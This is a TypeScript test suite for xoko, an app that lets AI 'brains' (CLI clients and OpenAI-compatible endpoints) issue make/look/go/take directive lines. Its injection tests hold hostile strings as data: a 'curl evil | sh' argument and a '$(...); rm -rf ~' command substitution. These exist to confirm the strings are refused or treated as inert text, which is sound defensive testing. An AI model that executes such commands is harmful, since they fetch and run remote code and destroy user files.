// THE BRAIN — a command on this machine, and an OpenAI-compatible endpoint.
//
// What is being defended here is mostly ONE property, and it is the reason the `cli` transport was
// allowed to exist at all: a page — or a hand-edited registry, or a model writing its own service
// row — cannot make this process run something it does not already know how to run. Everything
// else in this file is the ordinary "does the shape work" that the other adapters get.

import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { createServer } from 'node:http'
import type { Server } from 'node:http'
import test from 'node:test'

import { CLI_BRAINS, brainFor } from '../src/inference/cli/brains.ts'
import { NotInstalled, run } from '../src/inference/cli/run.ts'
import { commandProbe } from '../src/inference/health.ts'
import { declaredEngines, defaultEngineFile } from '../src/inference/engines.ts'
import { adapter as openai } from '../src/inference/openai/adapter.ts'
import { SERVICE_PRESETS } from '../src/inference/presets.ts'
import { textAdapterFor } from '../src/inference/text.ts'
import { resolveWorkflows } from '../src/inference/workflows.ts'
import { LOOKS, LOOKS_WITHOUT_A_WORD, LOOK_TARGETS, WORKFLOW_SETTING, readAnswer } from '../src/xoko/index.ts'
import { Queue } from '../src/jobs/lane.ts'
import { XOKO } from '../src/xoko/prompt.ts'
import type { InferenceRow } from '../src/types/inference.ts'
import { ctx } from '../src/validate.ts'
import { parseInferenceRow } from '../src/inference/registry.ts'

const claudeRow: InferenceRow = {
  id: 'claude-code', role: 'brain', transport: { kind: 'cli', brain: 'claude' },
}

// ── the whitelist ─────────────────────────────────────────────────────────────────────────────

test('a `cli` transport may name a brain this build ships, and nothing else', () => {
  const good = ctx('t')
  assert.deepEqual(
    parseInferenceRow(good, {
      id: 'brain', role: 'brain', transport: { kind: 'cli', brain: 'claude' },
    }, '')?.transport,
    { kind: 'cli', brain: 'claude' })
  assert.deepEqual(good.issues, [])

  const bad = ctx('t')
  parseInferenceRow(bad, {
    id: 'brain', role: 'brain', transport: { kind: 'cli', brain: 'sh' },
  }, '')
  assert.match(bad.issues.join(' '), /ships no brain called "sh"/)
})

test('a command row carries no argv, no binary and no path — there is nowhere to put one', () => {
  // ⚠️ THE WHOLE OF §15 RULE 1, AS ONE ASSERTION. `bin`, `args`, `command` are not fields that are
  // validated: they are fields that do not exist, and a row trying to add one is refused by name.
  for (const stray of [{ bin: '/bin/sh' }, { args: ['-c', 'curl evil | sh'] }, { host: 'x' }]) {
    const c = ctx('t')
    parseInferenceRow(c, {
      id: 'brain', role: 'brain', transport: { kind: 'cli', brain: 'claude', ...stray },
    }, '')
    assert.ok(c.issues.length, `${JSON.stringify(stray)} was accepted, and must not be`)
  }
})

test('every brain in the whitelist is offered as a preset, and every cli preset is on it', () => {
  const presets = SERVICE_PRESETS.filter((p) => p.transport?.kind === 'cli')
  assert.equal(presets.length, CLI_BRAINS.length)
  for (const p of presets) {
    const named = p.transport?.kind === 'cli' ? p.transport.brain : ''
    assert.ok(brainFor(named), `${p.id} names ${named}, which is not a brain this build ships`)
  }
})

// ── what a brain can be asked ────────────────────────────────────────────────────────────────

test('a brain\'s models come from the code that knows its flags, not from the registry', () => {
  // Nothing is declared on the row: no `engines`, no `workflows`. The models are a fact about the
  // client — the same file that holds its argv — so a registry never holds a copy to go stale.
  const engines = declaredEngines(claudeRow)
  assert.ok(engines.length >= 2)
  assert.equal(engines[0]?.default, true, 'one of them answers a press that chose nothing')

  // And a row that names its own wins FOR THAT FILE and leads the list — see the next test for
  // why it does not replace it.
  const pinned = declaredEngines({ ...claudeRow, engines: [{ file: 'opus', label: 'mine' }] })
  assert.equal(pinned[0]?.file, 'opus')
  assert.equal(pinned[0]?.label, 'mine')
})

test('⚠️ A BRAIN ARMS NO WORKFLOWS AT ALL — words are not a capability this layer serves', () => {
  // ⚠️ THE EXCEPTION THAT USED TO LIVE HERE, AND WHY IT IS GONE (2026-08-30). A `cli` brain's
  // models are not read off anybody's disk — they are in `brains.ts`, the same whitelist the parser
  // refuses a stranger against — so a `chat` workflow on one was `{ kind: chat, model: <that
  // engine> }`, a restatement of the engine, and this layer synthesised them rather than making
  // somebody take a file that said exactly that.
  //
  // The synthesis was right and the thing being synthesised was the mistake. An LLM CONNECTS TO
  // XOKO; everything that needs words is xoko doing it with whatever it is connected to. There is
  // no `chat` kind left, nothing to arm, and nothing here to imply.
  assert.ok(declaredEngines(claudeRow).length >= 2, 'the models are still known')
  assert.deepEqual(resolveWorkflows(claudeRow, null), [], 'a connection is not a shelf of offers')
})

test('which model xoko thinks with is a pin on the connection, and the others stay', () => {
  // ⚠️ THE BUG THIS IS HERE FOR. Naming your own `engines` REPLACES the declared list everywhere
  // else in this app, which is right when the alternative is a catalog read off a disk. On a
  // command-line brain the alternative is three names compiled into this build — so pinning one
  // used to delete the other two, and picking a model emptied the picker you picked it from.
  const pinned: InferenceRow = { ...claudeRow, engines: [{ file: 'opus', default: true }] }
  const list = declaredEngines(pinned)
  const files = list.map((m) => m.file)
  assert.ok(files.includes('opus') && files.includes('sonnet') && files.includes('haiku'),
    'the pin is one of the three, not instead of them')
  assert.equal(defaultEngineFile(pinned, null), 'opus', 'and it is what xoko thinks with')
  // ⚠️ AND YOUR ROW OVERRIDES WHAT IT SAYS, NOT WHAT IT OMITS. The pin the ✨ card writes is
  // `{ file, default }` and nothing else; a whole-row win renamed Claude Opus to `opus` in the
  // picker as the side effect of choosing it, which is a rename nobody asked for.
  assert.equal(list.find((m) => m.file === 'opus')?.label, 'Claude Opus')

  // Nothing pinned: the brain's own first model answers, so a fresh connection thinks with
  // something the moment it is made.
  assert.equal(defaultEngineFile(claudeRow, null), declaredEngines(claudeRow)[0]?.file)
})

test('⚠️ NOTHING IS IMPLIED OFF A CATALOG — the four-hundred-model failure this rule prevents', () => {
  // The exception is the TRANSPORT, not the medium. An OpenRouter row reports hundreds of models
  // over the OpenAI shape; if `text` were the test, every one of them would become an offer nobody
  // chose — which is the exact thing the no-synthesis rule was written for.
  const cloud: InferenceRow = {
    id: 'cloud', role: 'brain',
    transport: { kind: 'openai', host: 'openrouter.ai', port: 443, basePath: '/api/v1', tls: true },
  }
  const catalog = ['a-model', 'b-model', 'c-model']
    .map((name) => ({ name, file: name, version: '', builtin: false }))
  assert.deepEqual(resolveWorkflows(cloud, catalog), [], 'a catalog arms nothing, whatever it makes')

  // Same on the picture side, which never changed: a checkpoint on the disk is inventory.
  const dt: InferenceRow = {
    id: 'dt', transport: { kind: 'grpc', host: '127.0.0.1', port: 7859 },
  }
  assert.deepEqual(
    resolveWorkflows(dt, [{ name: 'SDXL', file: 'sdxl.ckpt', version: '', builtin: false }]), [])
})

test('installed is not signed in, and unreadable is not signed out', () => {
  // ⚠️ THE STATE THE SHELF COULD NOT SEE. `--version` says the binary is there; for months that
  // was the whole probe, and a machine that had never logged in once showed the same green dot as
  // one that had. This is the second question, and it is free: local credentials, ~0.2s, no token.
  const auth = brainFor('claude')?.auth
  assert.ok(auth, 'claude must declare how its sign-in is read')
  assert.deepEqual(auth.args, ['auth', 'status', '--json'])

  assert.deepEqual(
    auth.read('{"loggedIn":true,"authMethod":"claude.ai","subscriptionType":"pro"}'),
    { in: true, plan: 'pro' })
  assert.deepEqual(auth.read('{"loggedIn":false}'), { in: false, plan: null })
  // A plan the client does not name is still a sign-in. The card drops the suffix, nothing else.
  assert.deepEqual(auth.read('{"loggedIn":true}'), { in: true, plan: null })

  // ⚠️ NULL, NOT `{in: false}` — for every one of these. A client that changed its output format,
  // printed a warning first, or answered nothing must read as UNKNOWN: sending somebody to run
  // `claude auth login` when they are already logged in is the failure this shelf exists to avoid.
  for (const junk of ['', 'not json', '{}', '{"loggedIn":"yes"}', 'null', '[]']) {
    assert.equal(auth.read(junk), null, `${JSON.stringify(junk)} must not read as an answer`)
  }

  // ⚠️ AND A CLIENT WE HAVE NOT CHECKED DECLARES NOTHING, exactly like `stream`. Two lines on the
  // card instead of three; a guessed argv would report "signed out" for a machine that is not.
  assert.equal(brainFor('gemini')?.auth, null)
})

test('a transport that does not speak text says so, rather than failing later', () => {
  assert.throws(() => textAdapterFor({
    id: 'dt', transport: { kind: 'grpc', host: '127.0.0.1', port: 7859 },
  }), /does not speak text/)
})

// ── running one ──────────────────────────────────────────────────────────────────────────────

test('the words go in on stdin, and a sentence is only ever a sentence', async () => {
  // ⚠️ THE ARGV DISCIPLINE, DEMONSTRATED. `node -e` reads stdin and prints it back; what is passed
  // would be a command substitution, a redirect and a comment if any of this went near a shell.
  const nasty = '$(touch /tmp/xk-pwned); rm -rf ~ # `whoami`'
  const ran = await run(process.execPath, [
    '-e', 'process.stdin.on("data", (d) => process.stdout.write(d))',
  ], { input: nasty })
  assert.equal(ran.code, 0)
  assert.equal(ran.stdout, nasty)
})

test('a binary that is not there is `not-installed`, and one that fails is not', async () => {
  const missing = await commandProbe('xk-no-such-binary-anywhere', ['--version'], 2000)
  assert.equal(missing.state, 'not-installed')

  // ⚠️ INSTALLED AND UNHAPPY IS A DIFFERENT SENTENCE AND A DIFFERENT FIX. Reporting this as
  // "not installed" sends someone to download a thing they already have.
  const angry = await commandProbe(process.execPath, ['-e', 'process.exit(3)'], 4000)
  assert.equal(angry.state, 'unknown')
  assert.match(angry.detail ?? '', /exited 3/)
})

test('a missing binary is its own error, so the adapter can name the fix', async () => {
  await assert.rejects(run('xk-no-such-binary-anywhere', []), (err: Error) => {
    assert.ok(err instanceof NotInstalled)
    return true
  })
})

// ── the openai shape ─────────────────────────────────────────────────────────────────────────

async function stub(reply: unknown): Promise<{ port: number; seen: unknown[]; close: () => Promise<void> }> {
  const seen: unknown[] = []
  const server: Server = createServer((req, res) => {
    const chunks: Buffer[] = []
    req.on('data', (c: Buffer) => chunks.push(c))
    req.on('end', () => {
      seen.push({ url: req.url, body: JSON.parse(Buffer.concat(chunks).toString() || '{}') })
      res.writeHead(200, { 'content-type': 'application/json' })
      res.end(JSON.stringify(reply))
    })
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  const address = server.address()
  return {
    port: typeof address === 'object' && address ? address.port : 0,
    seen,
    close: () => new Promise((r) => server.close(() => r())),
  }
}

test('an OpenAI-compatible endpoint is asked in its own shape, framing and all', async () => {
  const s = await stub({ model: 'llama3.2:3b', choices: [{ message: { content: '  hello  ' } }] })
  try {
    const row: InferenceRow = {
      id: 'ollama', role: 'brain',
      transport: { kind: 'openai', host: '127.0.0.1', port: s.port, basePath: '/v1' },
    }
    const out = await openai.ask({
      row, model: 'llama3.2:3b', prompt: 'say hello', system: 'you are xoko',
    })
    assert.equal(out.text, 'hello', 'trimmed, because a leading newline is not an answer')
    assert.equal(out.model, 'llama3.2:3b', 'what actually answered, for the byline')

    const sent = s.seen[0] as { url: string; body: { messages: { role: string }[]; stream: boolean } }
    assert.equal(sent.url, '/v1/chat/completions')
    assert.deepEqual(sent.body.messages.map((m) => m.role), ['system', 'user'])
    assert.equal(sent.body.stream, false)
  } finally {
    await s.close()
  }
})

// ── the four verbs ───────────────────────────────────────────────────────────────────────────
//
// ⚠️ WHAT IS BEING DEFENDED HERE IS THE DEGRADATION, not the happy path. Every one of these lines
// is written by a model, most of them by a small local one, and the property that makes a bare
// directive line safe enough to use is that getting it wrong produces a turn you can READ — never
// a silent nothing, and never the wrong act.

test('a make line becomes an act, and the prose keeps the rest', () => {
  const { say, acts, looks } = readAnswer([
    'A fox in snow would suit the pencil style you have armed.',
    '',
    '▶ make image: a red fox curled in deep snow, low winter sun, long blue shadows',
  ].join('\n'))
  assert.deepEqual(looks, [])
  assert.equal(acts.length, 1)
  assert.deepEqual(acts[0], {
    verb: 'make', medium: 'image',
    settings: {}, style: null,
    target: 'image',
    text: 'a red fox curled in deep snow, low winter sun, long blue shadows',
  })
  // ⚠️ AND THE LINE IS GONE FROM THE PROSE. Leaving it would show the machinery twice — once as
  // an instruction nobody typed, once as the ▶ row it became.
  assert.equal(say, 'A fox in snow would suit the pencil style you have armed.')
})

test('the medium may stand in for the verb — the one near-miss worth forgiving', () => {
  // Brains write `▶ image:` because it reads like a heading. It is unambiguous, so it is a make.
  const { acts } = readAnswer('▶ image: a red fox')
  assert.deepEqual(acts, [{ verb: 'make', medium: 'image', target: 'image', settings: {}, style: null, text: 'a red fox' }])
})

test('a look asks a shelf, and the words after it are the filter', () => {
  const { looks, acts } = readAnswer([
    'Let me see what is published.',
    '▶ look: library sticker pack',
  ].join('\n'))
  assert.deepEqual(acts, [])
  assert.deepEqual(looks, [{ target: 'library', about: 'sticker pack' }])
})

test('a look with the target before the colon means the same thing', () => {
  assert.deepEqual(readAnswer('▶ look library: sticker').looks,
    [{ target: 'library', about: 'sticker' }])
})

test('go and take carry one argument and no medium', () => {
  const { acts } = readAnswer([
    '▶ go: images',
    '▶ take: draw-things-grpc/klein-t2i',
  ].join('\n'))
  assert.deepEqual(acts, [
    { verb: 'go', medium: null, target: null, settings: {}, style: null, text: 'images' },
    { verb: 'take', medium: null, target: null, settings: {}, style: null, text: 'draw-things-grpc/klein-t2i' },
  ])
})

test('⚠️ make may name a COMPOSITION, and the browser is what knows whether it exists', () => {
  // The line that makes a chain reachable by sentence. This side cannot tell a composition slug
  // from a typo — the folder is the browser's — so an unplaceable target comes back as
  // "there is no X here" in the transcript rather than being silently dropped.
  const { acts } = readAnswer('▶ make a-family-from-one-face: a badger who runs a bakery')
  assert.deepEqual(acts, [{
    verb: 'make', medium: null, target: 'a-family-from-one-face', settings: {}, style: null,
    text: 'a badger who runs a bakery',
  }])
})

test('a slash after the medium names the style that answers this one press', () => {
  const { acts } = readAnswer([
    '▶ make voice/old-sailor: All hands. The wind has changed.',
    '▶ make image/ink-linework: a lighthouse in a gale',
  ].join('\n'))
  // ⚠️ THE MEDIUM AND THE STYLE COME APART HERE, not in the browser. `target` stays the medium so
  // every existing call site reads the same thing it always did, and `style` is the new half.
  assert.deepEqual(acts[0], {
    verb: 'make', medium: 'voice', target: 'voice', settings: {}, style: 'old-sailor',
    text: 'All hands. The wind has changed.',
  })
  assert.equal(acts[1]?.style, 'ink-linework')
})

test('the half after the slash may be the words themselves, not only a name', () => {
  // ⚠️ A STYLE IS OPTIONAL TEXT THAT SHAPES A RESULT, never an object you must own first. This
  // took a slug and nothing else, so "read that as a happy kid" on a machine with no happy kid
  // installed was refused and the ask went nowhere — the workflow's own narrator answered instead.
  const { acts } = readAnswer(
    "▶ make voice/a happy kid, bright and quick: We're going to the beach!")
  assert.deepEqual(acts[0], {
    verb: 'make', medium: 'voice', target: 'voice', settings: {}, style: 'a happy kid, bright and quick',
    text: "We're going to the beach!",
  })
})

test('words after the slash keep their case, because a name in them is a name', () => {
  const { acts } = readAnswer('▶ make voice/a Scottish grandmother, warm: Come away in.')
  assert.equal(acts[0]?.style, 'a Scottish grandmother, warm')
  // …while the medium is still a slug, and is still read as one.
  assert.equal(acts[0]?.medium, 'voice')
})

// ── what a press is SET to (2026-08-23) ───────────────────────────────────────────────────────
//
// ⚠️ THE GAP THIS CLOSES. A music workflow publishes a tempo, a key, a length and a lyric sheet, all
// reachable from the ⚙ pane and none of them sayable by xoko — so "a jazz song, about ninety
// seconds, slowish" came out at the graph's own two minutes at 120 bpm and nothing said why.

test('a bracket before the colon is what this press is set to', () => {
  const { acts } = readAnswer('▶ make music [duration 90, bpm 72]: rain on a window at 2am')
  assert.deepEqual(acts[0], {
    verb: 'make', medium: 'music', target: 'music', style: null,
    settings: { duration: '90', bpm: '72' },
    text: 'rain on a window at 2am',
  })
})

test('a value may hold a space, because half of them do', () => {
  // ⚠️ THE FIRST WORD IS THE KEY AND THE REST IS THE VALUE. Splitting on whitespace would have
  // kept "D" and thrown "minor" away — and "D" is not a key ACE-Step has, so the render would
  // have failed on a value nobody typed.
  const { acts } = readAnswer(
    '▶ make music [keyscale D minor, duration 60]: a slow waltz for an empty ballroom')
  assert.deepEqual(acts[0]?.settings, { keyscale: 'D minor', duration: '60' })
})

test('settings ride alongside a style, not instead of one', () => {
  const { acts } = readAnswer('▶ make music/jazz-noir [duration 120]: rain on a window')
  assert.equal(acts[0]?.style, 'jazz-noir')
  assert.deepEqual(acts[0]?.settings, { duration: '120' })
  assert.equal(acts[0]?.text, 'rain on a window')
})

test('naming the workflow is one of the settings, not a second punctuation mark', () => {
  // A workflow is a setting of the press like any other, so it needs no syntax of its own — and
  // `make music.music-detail/jazz-noir:` is not a line anybody could read.
  const { acts } = readAnswer('▶ make music [workflow music-detail]: something worth keeping')
  assert.deepEqual(acts[0]?.settings, { workflow: 'music-detail' })
})

test('a pair with no value is dropped rather than sent as empty', () => {
  // An empty knob already means "as published", which is what leaving it out says. Storing '' would
  // send a blank where a number goes.
  const { acts } = readAnswer('▶ make music [bpm, duration 30]: a test tone')
  assert.deepEqual(acts[0]?.settings, { duration: '30' })
})

test('go and take take no settings — there is nothing to set', () => {
  const { acts } = readAnswer('▶ take [duration 90]: comfyui/music-fast')
  assert.deepEqual(acts[0]?.settings, {})
  assert.equal(acts[0]?.text, 'comfyui/music-fast')
})

test('a line with no bracket is the line it always was', () => {
  const { acts } = readAnswer('▶ make music: rain on a window')
  assert.deepEqual(acts[0]?.settings, {})
})

test('a composition slug is never cut at a slash, because it never has one', () => {
  // ⚠️ THE SPLIT ONLY HAPPENS WHEN THE LEFT HALF IS A MEDIUM. A target this app cannot place goes
  // to the browser WHOLE, which is what lets it answer "there is no X here" — cutting it first
  // would turn one unknown name into two and the message would name neither.
  const { acts } = readAnswer('▶ make some/thing: a badger who runs a bakery')
  assert.deepEqual(acts[0], {
    verb: 'make', medium: null, target: 'some/thing', settings: {}, style: null,
    text: 'a badger who runs a bakery',
  })
})

test('a ▶ inside a sentence is a sentence', () => {
  const { say, acts } = readAnswer('Press ▶ image: is what I would do, but it is your call.')
  assert.deepEqual(acts, [])
  assert.match(say, /Press ▶/)
})

test('a medium this app does not make is left as text, not guessed at', () => {
  // ⚠️ THE FAILURE MODE THAT MATTERS. A brain inventing `▶ film:` must produce a turn you can
  // READ — never a silent nothing, and never a render of the wrong kind.
  const { say, acts } = readAnswer('▶ film: a long tracking shot')
  assert.deepEqual(acts, [])
  assert.match(say, /▶ film/)
})

test('a verb this app does not have is left as text too', () => {
  // ⚠️ THE TABLE IS FOUR AND IT DOES NOT GROW. A brain that has decided it can `▶ delete:` or
  // `▶ arm:` gets its sentence printed, which is how you find out it tried.
  for (const line of ['▶ delete: every fox', '▶ arm: sdxl on images']) {
    const { say, acts, looks } = readAnswer(line)
    assert.deepEqual(acts, [])
    assert.deepEqual(looks, [])
    assert.equal(say, line)
  }
})

test('every line is performed — the counting is gone, and so is the second list', () => {
  // ⚠️ WHAT THIS REPLACES, AND WHY THE REPLACEMENT IS NOTHING (2026-08-23). There were three
  // numbers here — six acts, three of them renders, three lookups — and between them they produced
  // the worst turn this app has had: asked to plug two services and four workflows, half the lines
  // were set aside while the reply talked about all six as though they had run. The fix for THAT
  // was `dropped`, a second list handed back so the refusals could at least be seen: a mechanism
  // built to make a limit legible rather than a limit worth having.
  //
  // None of the three was protecting anybody. An install writes a few kilobytes and is undone from
  // the screen it lands on; a lookup is a file read, and how many ROUNDS of them a question costs
  // is bounded where that cost is (MAX_HOPS, in the loop); a render costs real time and disk, and
  // the queue that runs it is serial, visible and cancellable. A reply asking for eleven pictures
  // is a judgement failure, and a judgement failure is the prompt's to name.
  const six = ['a', 'b', 'c', 'd', 'e', 'f'].map((x) => `▶ take: svc/${x}`).join('\n')
  assert.equal(readAnswer(six).acts.length, 6)

  const five = ['a', 'b', 'c', 'd', 'e'].map((x) => `▶ make image: ${x}`).join('\n')
  const { acts, say } = readAnswer(five)
  assert.equal(acts.length, 5, 'a render is a real cost, and it is still not a number in the parser')
  assert.equal(say, '', 'the prose is what is left after the lines come out — all of them')

  const many = ['a', 'b', 'c', 'd', 'e'].map((x) => `▶ look: library ${x}`).join('\n')
  assert.equal(readAnswer(many).looks.length, 5)

  assert.equal('dropped' in readAnswer(six), false, 'the second list went with the limit')
})

test('the prompt is where "do not fill their disk" lives now', () => {
  // The rule did not disappear with the number — it moved to where judgement is, which is the only
  // place it could ever have been enforced properly.
  assert.match(XOKO, /a render costs them time and disk/i)
})

test('the transcript travels, in each brain’s own shape', async () => {
  const s = await stub({ choices: [{ message: { content: 'ok' } }] })
  try {
    const row: InferenceRow = {
      id: 'ollama', role: 'brain',
      transport: { kind: 'openai', host: '127.0.0.1', port: s.port, basePath: '/v1' },
    }
    await openai.ask({
      row, model: 'm', prompt: 'and now?', system: 'you are xoko',
      history: [{ said: 'hello', answered: 'hello yourself' }],
    })
    const sent = s.seen[0] as { body: { messages: { role: string; content: string }[] } }
    // ⚠️ NEITHER SIDE KEEPS A SESSION. What the brain knows is what is on screen, which is why
    // this arrives from the browser and is rebuilt into the vendor's shape here.
    assert.deepEqual(sent.body.messages.map((m) => m.role),
      ['system', 'user', 'assistant', 'user'])
    assert.equal(sent.body.messages[1]?.content, 'hello')
    assert.equal(sent.body.messages[3]?.content, 'and now?')
  } finally {
    await s.close()
  }
})

test('⏹ kills what it started, rather than leaving it running', async () => {
  const stop = new AbortController()
  const slow = run(process.execPath, ['-e', 'setTimeout(() => {}, 60000)'], { signal: stop.signal })
  setTimeout(() => stop.abort(), 50)
  await assert.rejects(slow, /was stopped/)
})

// ── watching it think ────────────────────────────────────────────────────────────────────────

/** An SSE stub: one `data:` line per piece, then the sentinel. */
async function sseStub(pieces: readonly string[]): Promise<{ port: number; close: () => Promise<void> }> {
  const server: Server = createServer((req, res) => {
    req.on('data', () => {})
    req.on('end', () => {
      res.writeHead(200, { 'content-type': 'text/event-stream' })
      for (const p of pieces) {
        res.write(`data: ${JSON.stringify({ choices: [{ delta: { content: p } }] })}\n\n`)
      }
      // ⚠️ A COMMENT LINE AND A KEEPALIVE, because real servers send them and a parser that
      // treats every line as JSON dies on the first one.
      res.write(': keepalive\n\n')
      res.write('data: [DONE]\n\n')
      res.end()
    })
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  const address = server.address()
  return {
    port: typeof address === 'object' && address ? address.port : 0,
    close: () => new Promise((r) => server.close(() => r())),
  }
}

test('an answer arrives in pieces, and the pieces are the answer', async () => {
  const s = await sseStub(['Ultra', 'marine is ', 'a blue.'])
  try {
    const row: InferenceRow = {
      id: 'ollama', role: 'brain',
      transport: { kind: 'openai', host: '127.0.0.1', port: s.port, basePath: '/v1' },
    }
    const seen: string[] = []
    const out = await openai.ask({
      row, model: 'm', prompt: 'what is ultramarine?', onDelta: (t) => seen.push(t),
    })
    assert.deepEqual(seen, ['Ultra', 'marine is ', 'a blue.'])
    assert.equal(out.text, 'Ultramarine is a blue.', 'the whole answer, from the same deltas')
  } finally {
    await s.close()
  }
})

test('asking for no deltas asks the server not to stream', async () => {
  const s = await stub({ choices: [{ message: { content: 'ok' } }] })
  try {
    const row: InferenceRow = {
      id: 'ollama', role: 'brain',
      transport: { kind: 'openai', host: '127.0.0.1', port: s.port, basePath: '/v1' },
    }
    await openai.ask({ row, model: 'm', prompt: 'hi' })
    assert.equal((s.seen[0] as { body: { stream: boolean } }).body.stream, false)
  } finally {
    await s.close()
  }
})

test('a client that streams reads its own envelope, and skips what is not the answer', () => {
  const claude = brainFor('claude')
  assert.ok(claude?.stream, 'the one brain whose streaming shape has been exercised here')
  const delta = claude.stream.delta
  const event = (d: unknown): unknown => ({ type: 'stream_event', event: { type: 'content_block_delta', delta: d } })
  assert.equal(delta(event({ type: 'text_delta', text: 'hello' })), 'hello')
  // ⚠️ THINKING IS NOT SAYING. It rides the same stream, and showing it would put the model's
  // scratch work in the transcript as though it had answered.
  assert.equal(delta(event({ type: 'thinking_delta', thinking: 'hmm' })), null)
  assert.equal(delta({ type: 'system', subtype: 'thinking_tokens' }), null)
  assert.equal(delta({ type: 'rate_limit_event' }), null)
})

test('a brain whose streaming shape is unverified says so, rather than guessing one', () => {
  // The registry's whole discipline, one layer down: `null` is "not checked", and the buffered
  // path still works. A guess here would be a client that answers nothing at all.
  assert.equal(brainFor('gemini')?.stream, null)
})

// ⚠️ FOUR RULES THAT COST A CONVERSATION EACH, AND ONE SENTENCE THAT CAUSED THEM. These are prose
// assertions, which is unusual and deliberate: the prompt is the only part of xoko with no types
// and no compiler, so a rule dropped while rewording a paragraph fails nowhere. Each anchor below
// is a heading in `src/xoko/prompt.ts`; changing the wording under one is free, losing one is not.

test('the prompt says what a bracket is, and the browser agrees what the reserved key is', () => {
  // ⚠️ ONE WORD IN TWO PLACES, and this is what holds them together. `WORKFLOW_SETTING` is the
  // server's; the shell repeats it as a literal because the grammar is TypeScript the browser
  // never loads. If they drift, `[workflow music-detail]` silently becomes a knob nobody has.
  assert.equal(WORKFLOW_SETTING, 'workflow')
  const shell = readFileSync(new URL('../web/lib/shell.js', import.meta.url), 'utf-8')
  assert.match(shell, new RegExp(`const WORKFLOW_SETTING = '${WORKFLOW_SETTING}'`),
    'the browser is carrying a different word for the reserved setting')
  assert.match(XOKO, /A SQUARE BRACKET BEFORE THE COLON IS WHAT THIS PRESS IS SET TO/)
  // ⚠️ AND IT MUST NOT LIST THE KEYS. What a medium can be set to is whatever the PLUGGED workflow
  // declares, and it changes the moment somebody plugs another one — a prompt naming `bpm` would
  // be a copy of the catalog, wrong the day after it was written.
  assert.doesNotMatch(XOKO, /\bkeyscale\b/, 'the keys belong on the map, not in the framing')
})

test('the prompt still carries every rule the first real conversations bought', () => {
  const rules: [RegExp, string][] = [
    [/A TURN IS AN ANSWER OR AN ACT/,
      'asked "what do you suggest for images?", it recommended AND installed'],
    [/A RECOMMENDATION ENDS THE TURN/,
      'the next word after a recommendation is theirs, and it is "ok, do it"'],
    [/THOSE FOUR ARE THE WHOLE OF WHAT YOU CAN DO/,
      'with no stated limit it offered to wire a workflow to their checkpoints — no such verb'],
    [/YOU NEVER DECIDE WHAT THEY ARE MAKING/,
      'asked whether it COULD render, it wrote and fired a still life nobody asked for'],
    [/THE MAP IS THE AUTHORITY ON WHAT CAN RUN/,
      'it promised a render with an empty image shelf in its own context'],
    // ⚠️ THE THREE LAYERS. Told only that a workflow sits on a service, it took both, watched the
    // map flip to ARMED and stopped — leaving eight voices on the library and one voice in 🗣.
    // The rule shrank on 2026-08-23 when the map started answering instead of tallying: what it
    // still has to say is that the named act is the FIRST missing layer, not the only one.
    [/NAMES THE ONE ACT THAT WOULD CHANGE THAT/,
      'a medium can be missing a style as well as a workflow, and only the middle one was named'],
    // ⚠️ THE 3D LINE. A picture-driven workflow is armed and unusable at once, and xoko cannot
    // attach anything — there is no verb for it.
    [/SOME WORKFLOWS NEED A PICTURE ATTACHED/,
      'it would promise a mesh from a sentence, which the section refuses before it queues'],
    // ⚠️ THE ONE THING BESIDES THE MEDIUM IT MAY NAME. The rule was "THE SLUG COMES FROM ▶ look:
    // styles AND NOWHERE ELSE" until 2026-08-23, when the slash learned to take words — it was
    // right about the failure (an invented slug is refused and the turn is spent) and wrong about
    // the cure, which was to make owning a style the price of describing one.
    [/Never invent a slug/,
      'a remembered or invented style name is refused, and the turn is spent'],
    [/Use WORDS when they described what they wanted and nothing saved matches/,
      'a style is optional text that shapes a result, not an object you must own first'],
    // ⚠️ IT WROTE THE PERSON'S OWN PHRASE BACK AS A CATALOG ID, hyphens and all, and the thing
    // they meant was published one line away under a different name on a service they had not
    // mentioned.
    [/AN ID IS READ OFF ▶ look: library, NEVER ASSEMBLED OUT OF THEIR WORDS/,
      'what somebody calls a thing in a sentence is a description, not an id'],
    // ⚠️ THE FLUENT LIE. Asked for six installs, it reported which had landed and explained why
    // the others had not — before any of them had run, and it is never told how they went.
    [/A VERB LINE IS A REQUEST, NOT A RESULT/,
      'it narrated outcomes it had not been given and then reasoned from them'],
  ]
  for (const [anchor, why] of rules) assert.match(XOKO, anchor, why)

  // ⚠️ THE SENTENCE THAT HAS TO STAY GONE. "Say what you are doing in the prose and then do it"
  // was written about a turn already decided, and got read as a licence to decide.
  assert.doesNotMatch(XOKO, /and then do it/,
    'that phrasing turns a recommendation into an installation')
})

test('the prompt still names no section, no workflow and no service', () => {
  // The rule the whole file is built on: everything specific to THIS app arrives as the map. A
  // prompt that named the sections would be a second copy of the menu, wrong the day after.
  for (const leak of ['drawn', 'images', 'draw-things-grpc', 'comfyui', 'ollama', 'sdxl']) {
    assert.doesNotMatch(XOKO, new RegExp(leak, 'i'), `${leak} belongs in the map, not the prompt`)
  }
})

test('a lyric sheet goes in a fence, because the bracket splits on its own commas', () => {
  // ⚠️ THE FAILURE THIS EXISTS FOR (2026-08-23). Asked for a one-minute song with words, xoko put
  // the chorus in the bracket. `readSettings` split it on the commas inside the lyric and the
  // press was refused for four knobs nobody had ever declared — "no windows or here or hearts or
  // and to set". The value was never wrong; the channel was. A fence needs no escaping and holds
  // line breaks, which a one-line bracket cannot do at any price.
  const { say, acts } = readAnswer([
    '▶ make music [duration 60, bpm 118]: upbeat sunny pop, bright synths, female lead',
    '```lyrics',
    'Roll the windows down, here we go',
    '',
    'chasing the sun with the radio on',
    '```',
    'That should sing.',
  ].join('\n'))
  assert.equal(say, 'That should sing.')
  assert.deepEqual(acts[0]?.settings, {
    duration: '60',
    bpm: '118',
    lyrics: 'Roll the windows down, here we go\n\nchasing the sun with the radio on',
  })
})

test('several fences may follow one line, and a fence with no ▶ above it is left alone', () => {
  const { acts } = readAnswer([
    '▶ make music [duration 30]: a lullaby',
    '```lyrics',
    'hush now',
    '```',
    '```language',
    'en',
    '```',
  ].join('\n'))
  assert.deepEqual(acts[0]?.settings, { duration: '30', lyrics: 'hush now', language: 'en' })

  // A fenced block in ordinary prose is somebody being shown some code. Swallowing it would be
  // this parser deciding a paragraph was a parameter.
  const loose = readAnswer(['Here is what that looks like:', '```json', '{ "a": 1 }', '```'].join('\n'))
  assert.equal(loose.acts.length, 0)
  assert.match(loose.say, /"a": 1/)
})

